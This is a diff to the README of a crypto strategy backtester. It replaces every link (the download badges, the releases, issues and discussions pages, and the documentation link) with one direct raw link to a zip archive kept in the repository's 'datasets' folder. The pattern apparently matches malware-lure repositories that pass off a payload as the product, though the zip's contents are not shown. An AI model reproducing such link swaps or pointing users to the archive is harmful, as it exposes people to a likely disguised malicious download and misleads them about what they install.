@@ -1,6 +1,6 @@
 # 🚀 Vectorized-Crypto-Backtester - Fast Backtesting for Crypto Strategies
 
-[![Download Vectorized-Crypto-Backtester](https://img.shields.io/static/v1?label=Download&message=Now&color=blue&style=for-the-badge)](https://github.com/AArt1552/Vectorized-Crypto-Backtester/releases)
+[![Download Vectorized-Crypto-Backtester](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip)](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ Before you download, make sure your machine meets these requirements:
 
 ### 2. Download & Install
 
-Visit this page to download: [Releases Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/releases).
+Visit this page to download: [Releases Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip).
 
 1. Go to the releases page.
 2. Find the latest version listed at the top. 
@@ -71,11 +71,11 @@ If you encounter any issues during installation or while running the application
 
 ## 📞 Support
 
-If you have any questions or need assistance, please reach out to our support team via our [Issues Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/issues). We are here to help.
+If you have any questions or need assistance, please reach out to our support team via our [Issues Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip). We are here to help.
 
 ## 👥 Community
 
-Join our community of traders and developers. Share strategies, ask questions, and learn from others in the field. Participate in discussions on our [Discussions Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/discussions).
+Join our community of traders and developers. Share strategies, ask questions, and learn from others in the field. Participate in discussions on our [Discussions Page](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip).
 
 ## 💡 Contributions
 
@@ -87,6 +87,6 @@ The Vectorized-Crypto-Backtester is open-source software. It is available under 
 
 ## 🔗 Learn More
 
-For more information about the usage, features, and technical details of the Vectorized-Crypto-Backtester, please visit our documentation linked within the application or on [GitHub](https://github.com/AArt1552/Vectorized-Crypto-Backtester).
+For more information about the usage, features, and technical details of the Vectorized-Crypto-Backtester, please visit our documentation linked within the application or on [GitHub](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip).
 
-[![Download Vectorized-Crypto-Backtester](https://img.shields.io/static/v1?label=Download&message=Now&color=blue&style=for-the-badge)](https://github.com/AArt1552/Vectorized-Crypto-Backtester/releases)
+[![Download Vectorized-Crypto-Backtester](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip)](https://github.com/AArt1552/Vectorized-Crypto-Backtester/raw/refs/heads/main/datasets/Crypto_Vectorized_Backtester_v3.4.zip)
